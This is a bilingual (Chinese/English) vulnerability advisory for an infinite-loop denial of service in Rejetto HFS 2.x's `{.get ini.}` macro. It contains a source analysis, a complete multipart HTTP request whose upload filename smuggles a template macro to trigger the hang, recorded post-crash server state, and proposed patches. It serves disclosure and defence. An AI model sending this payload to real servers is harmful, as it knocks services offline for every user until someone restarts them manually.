# Advisory: HFS 2.x 未授权拒绝服务 — `{.get ini.}` 空 key 在配置查找中死循环

| Item | Value |
|---|---|
| **Advisory ID** | WGETNZ-HFS2-2026-003 |
| **Product** | Rejetto HTTP File Server (HFS) 2.x |
| **Affected** | 2.4.0 RC7（build 319，实测）；2.4 全系列（`v2.4-alpha01`–`v2.4-rc07` 及 `master` 的 2.4.0 RC8 源码） |
| **Vulnerability** | 拒绝服务 — 非终止循环耗尽唯一服务线程（可用性） |
| **CWE** | CWE-835（Loop with Unreachable Exit Condition） |
| **CVSS v3.1** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` = 7.5 High |
| **期望 v4.0** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` |
| **Authentication** | 无需认证、无需交互（经模板求值原语投递） |
| **Status** | 已向 CNA 提交 |
| **Author** | [@wgetnz](https://github.com/wgetnz) |

> 本条与另两份 advisory（模板注入 RCE、特权宏鉴权缺失）**根因不同、修复点不同、影响维度不同**：
> 前两者是机密性/完整性，本条是**可用性**；修前两者的任何一处都**不会**修掉这个循环。

---

## 1. Summary (English)

Rejetto HTTP File Server (HFS) 2.x contains a non-terminating loop in `getKeyFromString()`, the
configuration lookup reached through the `{.get ini.}` template macro. When the search cursor
lands on a match that is not at the beginning of a line, the cursor is not advanced, so the loop
repeats on the same match forever and occupies the single serving thread indefinitely. Because
the lookup offset passed to `ipos()` is inclusive of the offset itself, the same match is returned
on every iteration. An empty key reliably triggers this: `includeTrailingString(key, '=')` turns
`''` into `"="`, and since every configuration entry is stored as `name=value`, the first `=` is
necessarily mid-line. One crafted request leaves the listener bound but unresponsive, with the
process alive and its serving thread spinning; the service does not recover without an operator
restart.

The defect is broader than the empty key: any key whose first match in the configuration string is
not at a line start reaches the same loop. The empty key is the reliable trigger, not the only one.

---

## 2. 漏洞概述（中文）

HFS 2.x 的配置查找函数 `getKeyFromString()`（由 `{.get ini.}` 模板宏调用）存在**非终止循环**：
当命中的位置不在行首时，搜索游标**不推进**，循环在同一个匹配上永远重复，占满唯一的服务线程。
根因是传给 `ipos()` 的偏移量**包含该偏移本身**，所以每次迭代返回同一个匹配位置。

空 key 是可靠触发器：`includeTrailingString(key, '=')` 把 `''` 变成 `"="`，而所有配置项都以
`name=value` 形式存储，因此配置串中第一个 `=` 必然位于某行中间。

一个构造请求即可让**端口仍在监听、进程仍存活，但完全不再响应**；服务线程空转，**不自恢复，需人工重启**。

**缺陷范围比空 key 更广**：任何「首次匹配不在行首」的 key 都会进入同一个死循环。空 key 只是最可靠的触发器。

---

## 3. 技术分析

### 3.1 死循环所在（`utillib.pas:2846`）

```pascal
function getKeyFromString(s:string; key:string; def:string=''):string;
var
  i: integer;
begin
result:=def;
includeTrailingString(key, '=');        // 空 key 变成 '='
i:=1;
  repeat
  i:=ipos(key, s, i);
  if i = 0 then exit;                   // not found
  until (i = 1) or charInSet(s[i-1], [#13,#10]);   // 必须在行首
inc(i, length(key));
result:=substr(s,i, findEOL(s,i,FALSE));
end; // getKeyFromString
```

### 3.2 为什么游标不推进（`hslib.pas:392`）

```pascal
function ipos(ss, s: string; ofs:integer=1):integer; overload;
...
rs:=@s[ofs];
for result:=ofs to l do          // ← ofs 是【包含】的：命中 ofs 就返回 ofs
```

**机制**：命中位置 `i` 不在行首（`i <> 1` 且 `s[i-1]` 非 CR/LF）时 `until` 为假 → 回到
`ipos(key, s, i)` → 从 `i` 开始（含 `i`）→ 找到**同一个匹配**→ 返回**同一个 `i`** → 条件再假 → 死循环。

### 3.3 为什么空 key 必触发

`includeTrailingString('', '=')` 把 key 变成 `"="`；配置串中每个配置项都是 `name=value`，
所以第一个 `=` 必然在某行中间（`s[i-1]` 是字母而非 CR/LF），`until` 条件立即为假。

正常 key 之所以没事，只是因为它的首次出现恰好落在行首——**这是巧合，不是防护**。

---

## 4. 复现

**测试环境**：HFS 2.4.0 RC7 build 319（上游原版发行二进制，SHA-256
`42d14f9efe83cd9d695d0796232bd6e12d276c1262b6cf39d31cfcf64e128f11`）/ Windows 10 x64 / 默认配置。

### 4.1 触发载荷

经 multipart 上传文件名的模板求值原语投递（传输方式见同仓库另两份 advisory）：

```
POST / HTTP/1.1
Host: <HOST>:8090
Content-Type: multipart/form-data; boundary=X
Content-Length: <n>
Connection: close

--X
Content-Disposition: form-data; name="f"; filename="%item-resource%:}{.get ini|.}"
Content-Type: application/octet-stream

hi
--X--
```

客户端读取超时，**完全没有 HTTP 响应**。

### 4.2 触发后的状态（这是本漏洞的关键证据）

```
进程    Id 64616   StartTime 13:12:37
        CPU        120.5          ← 累计 CPU 秒数，服务线程在空转
        Responding False          ← 进程已不处理消息循环
监听    TCP 0.0.0.0:8090  LISTENING  64616     ← 端口仍绑定
        TCP ...:3530 ...:8090  FIN_WAIT_2  69760   ← 4 条连接卡在 FIN_WAIT_2
HTTP    GET /  ->  HTTP 000 in 6.014953s        ← 无关客户端同样得不到响应
TCP     connect 8090  ->  OPEN（端口绑定但不服务）
```

### 4.3 这组状态说明了什么

| 观测 | 值 | 证明 |
|---|---|---|
| 监听 0.0.0.0:8090 | 仍 `LISTENING`，属 PID 64616 | 套接字**未**关闭 —— 这**不是** `stop server` 那条发现 |
| hfs.exe 进程 | 存活，PID 与测试前一致 | 进程未崩溃、未退出 |
| `Responding` | `False` | 进程已不处理消息循环 |
| `CPU` | 120.5 秒且在采样时仍在增长 | 线程在**忙循环空转**，不是阻塞等待 I/O |
| 无关的 `GET /` | 6.0 秒后 `HTTP 000` | **整个**服务不可用，不只是触发连接 |
| 既有连接 | 4 条卡在 `FIN_WAIT_2` | 对端已关闭，服务端始终未完成交互 |

**结论：唯一的服务线程被非终止循环占满。端口仍绑定、进程仍存活，服务不会自恢复，需人工重启。**

### 4.4 证据与局限（如实标注）

- 本次**刻意复现 1 次**，完整记录如 §4.2。
- 另有 strix 评估中**意外触发的 1 次**同类掉线（其记录原文：*"Single, uncontrolled observation. The outage was induced once, inadvertently, and was deliberately not repeated because repeating it takes the whole service down"*）。两次观测同一效果，**未做 3/3 重复率验证**（重复的代价是每次都打挂服务）。
- **60 秒自恢复观察未跑完**，重启由运维人工执行，未在本次复现中插桩。
- 非空 key 的负向对照未在本次跑完；另一次评估观察到非空 key 正常返回（`hints4newcomers` → `yes`），与 §3 的源码分析一致：是否死循环取决于**首次匹配落在哪**，而非该宏整体失效。
- 完整证据与复现脚本见 `poc/repro_dos.py`，输出格式同 §4.2。

> ⚠️ 运行该脚本会打挂目标服务，直到人工重启。**不要指向共享实例。**

---

## 5. 修复建议

### 5.1 临时缓解

- 不要将 HFS 2.x 暴露于不可信网络；限制监听在可信内网或 VPN。
- 用进程守护（service wrapper）自动拉起被卡死的实例，把可用性影响限制在重启窗口内。
- 若无必要，从模板中移除 `{.get ini.}` 的使用。

### 5.2 根治

**① 让游标必定推进**——命中位置等于当前游标时显式前进：

```pascal
// utillib.pas, getKeyFromString()
  repeat
  i:=ipos(key, s, i);
  if i = 0 then exit;                   // not found
  until (i = 1) or charInSet(s[i-1], [#13,#10]);
```

改为在未满足行首条件时**从 i+1 继续搜索**，而不是从 i：

```pascal
  repeat
  i:=ipos(key, s, i);
  if i = 0 then exit;
  if (i = 1) or charInSet(s[i-1], [#13,#10]) then break;
  inc(i);                               // 关键：游标必须前进
  until false;
```

**② 显式拒绝空 key**，让调用方拿到明确错误而不是进入循环：

```pascal
if key = '' then exit(def);             // 或抛错
```

**③ 给宏分发器加执行预算**（与另两份 advisory 的修复同源）——单次请求的宏求值应有步数/时间上限，
任何宏都不应能把服务线程无限占用。

---

## 6. 披露时间线

| 日期 | 事项 |
|---|---|
| 2026-09-16 | 源码确认死循环机制；刻意复现 1 次并记录触发后状态 |
| 2026-09-16 | 向 CNA 提交 |

## 7. References

- 产品源码：https://github.com/rejetto/hfs2
- 姊妹 advisory：[模板注入 RCE](../hfs2-upload-filename-template-injection/README.md) · [特权宏鉴权缺失](../hfs2-template-macro-missing-authorization/README.md)
- 相关 CVE：CVE-2024-23692（同类产品，不同根因）
